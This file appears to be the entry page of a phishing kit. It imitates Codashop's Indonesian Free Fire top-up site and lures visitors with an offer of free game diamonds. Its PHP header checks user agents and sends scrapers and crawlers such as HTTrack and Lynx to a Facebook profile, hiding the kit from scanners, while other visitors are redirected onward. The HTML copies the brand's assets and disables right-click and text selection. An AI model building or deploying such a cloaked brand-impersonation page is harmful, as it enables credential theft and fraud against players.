<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}

header('location: free-fire');
?>
<!DOCTYPE html>
<html>
    <head>
        <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/xss.min.js"></script>

        <!-- Google Tag Manager -->
        <script>
            dataLayer = [
                {
                    totalPrice: "",
                    orderId: "",
                    currency: "",
                    orderStatus: "",
                    paymentChannel: "",
                    items: "",
                    country: "ID",
                    gvt: "",
                    lvt: "",
                    pagetype: filterXSS("Home"),
                },
            ];
        </script>

        <!-- Google Tag Manager -->
        <script>
            (function (w, d, s, l, i) {
                w[l] = w[l] || [];
                w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
                var f = d.getElementsByTagName(s)[0],
                    j = d.createElement(s),
                    dl = l != "dataLayer" ? "&l=" + l : "";
                j.async = true;
                j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl;
                f.parentNode.insertBefore(j, f);
            })(window, document, "script", "dataLayer", "GTM-PF7TJ9");
        </script>
        <!-- End Google Tag Manager -->

        <script src="https://script.tapfiliate.com/tapfiliate.js" type="text/javascript" async></script>

        <script type="text/javascript">
            (function (t, a, p) {
                t.TapfiliateObject = a;
                t[a] =
                    t[a] ||
                    function () {
                        (t[a].q = t[a].q || []).push(arguments);
                    };
            })(window, "tap");

            tap("create", "11857-697628");
            tap("detect");
        </script>

        <meta charset="UTF-8" />

        <!--[if lt IE 9]>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
        <![endif]-->

        <title>Free Fire (Indonesia) - Codashop</title>

        <meta name="generator" content="coda2" />
        <meta name="viewport" content="width=device-width, maximum-scale=1.0, minimum-scale=1.0, initial-scale=1.0" />
        <meta name="mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="application-name" content="Codashop" />
        <meta name="apple-mobile-web-app-capable " content="yes " />
        <meta name="apple-mobile-web-app-status-bar-style " content="black " />
        <meta name="apple-mobile-web-app-title " content="Codashop " />
        <link rel="apple-touch-icon " href="https://cdn1.codashop.com/S2/content/mobile/images/app/codashop-ico-192x192.eda9c373cc.png" />
        <meta name="msapplication-TileImage " content="https://cdn1.codashop.com/S2/content/mobile/images/app/codashop-ico-144x144.e4494b8304.png" />
        <meta name="msapplication-TileColor " content="#f76b1d " />
        <meta name="theme-color " content="#f76b1d" />
        <link rel="manifest" href="/manifest.json" />
        <meta name="format-detection" content="telephone=no" />
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <link rel="icon" type="image/x-icon" href="https://cdn1.codashop.com/S/content/common/images/favicon.ico" />
        <link rel="stylesheet" type="text/css" media="all" href="https://cdn1.codashop.com/S/content/common/css/flags.css" />

        <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/jquery331.min.e703a20343.js"></script>
        <link rel="stylesheet" href="https://cdn1.codashop.com/S2/content/common/css/flickity.min.15c54c97d1.css" />
        <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/flickity.pkgd.min.70c401a5e7.js"></script>
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>

        <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-fontfaces.b6c83d3582.css" />

        <!-- info bar css -->
        <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/infoBar.662b8f1b5f.css" />

        <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-topnav2.5566e671b1.css" />

        <!-- switching css for arabic country -->

        <link rel="stylesheet" type="text/css" media="all" href="https://cdn1.codashop.com/S2/content/mobile/css/codashop-landing2.d0ec32efac.css" />

        <link rel="alternate" hreflang="x-default" href="https://www.codashop.com/international/" />

        <link rel="alternate" hreflang="id-ID" href="https://www.codashop.com/id/" />

        <link rel="alternate" hreflang="en-SG" href="https://www.codashop.com/sg/" />

        <link rel="alternate" hreflang="en-MY" href="https://www.codashop.com/my/" />

        <link rel="alternate" hreflang="th-TH" href="https://www.codashop.com/th/" />

        <link rel="alternate" hreflang="en-PH" href="https://www.codashop.com/ph/" />

        <link rel="alternate" hreflang="vi-VN" href="https://www.codashop.com/vn/" />

        <link rel="alternate" hreflang="en-LK" href="https://www.codashop.com/lk/" />

        <link rel="alternate" hreflang="ja-JP" href="https://www.codashop.com/jp/" />

        <link rel="alternate" hreflang="my-MM" href="https://www.codashop.com/mm/" />

        <link rel="alternate" hreflang="km-KH" href="https://www.codashop.com/kh/" />

        <link rel="alternate" hreflang="ar-EG" href="https://www.codashop.com/eg/" />

        <link rel="alternate" hreflang="ar-SA" href="https://www.codashop.com/sa/" />

        <link rel="alternate" hreflang="ar-AE" href="https://www.codashop.com/ae/" />

        <link rel="alternate" hreflang="lo-LA" href="https://www.codashop.com/la/" />

        <link rel="alternate" hreflang="en-IN" href="https://www.codashop.com/in/" />

        <link rel="alternate" hreflang="pt-BR" href="https://www.codashop.com/br/" />

        <link rel="alternate" hreflang="es-MX" href="https://www.codashop.com/mx/" />

        <link rel="alternate" hreflang="es-AR" href="https://www.codashop.com/ar/" />

        <link rel="alternate" hreflang="ar-BH" href="https://www.codashop.com/bh/" />

        <link rel="alternate" hreflang="ar-MA" href="https://www.codashop.com/ma/" />

        <link rel="alternate" hreflang="ar-KW" href="https://www.codashop.com/kw/" />

        <link rel="alternate" hreflang="en-BD" href="https://www.codashop.com/bd/" />

        <link rel="alternate" hreflang="tr-TR" href="https://www.codashop.com/tr/" />

        <link rel="alternate" hreflang="ru-RU" href="https://www.codashop.com/ru/" />

        <link rel="alternate" hreflang="zh-TW" href="https://www.codashop.com/tw/" />

        <link rel="alternate" hreflang="en-ZA" href="https://www.codashop.com/za/" />

        <link rel="alternate" hreflang="en-NG" href="https://www.codashop.com/ng/" />

        <link rel="alternate" hreflang="mn-MN" href="https://www.codashop.com/mn/" />

        <link rel="alternate" hreflang="en-PK" href="https://www.codashop.com/pk/" />

        <link rel="alternate" hreflang="en-CA" href="https://www.codashop.com/ca/" />

        <!-- OG Tags Start -->
        <meta property="og:url" content="https://www.codashop.com/id/" />
        <meta property="og:type" content="website" />
        <meta property="og:title" content="Free Fire (Indonesia) - Codashop" />
        <meta property="og:description" content="Ikuti event codashop untuk mendapatkan Diamond Free Fire Gratis" />

        <meta property="og:image" content="https://cdn1.codashop.com/S/content/common/images/mno/freefire_640x241.png" />
        <meta property="og:image:width" content="1200" />
        <meta property="og:image:height" content="630" />
        <!-- OG Tags End -->
        <meta name="description" content="Ikuti event codashop untuk mendapatkan Diamond Free Fire Gratis" />
    </head>

    <body class="theme-page--landing-page" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
        
    </body>
</html>
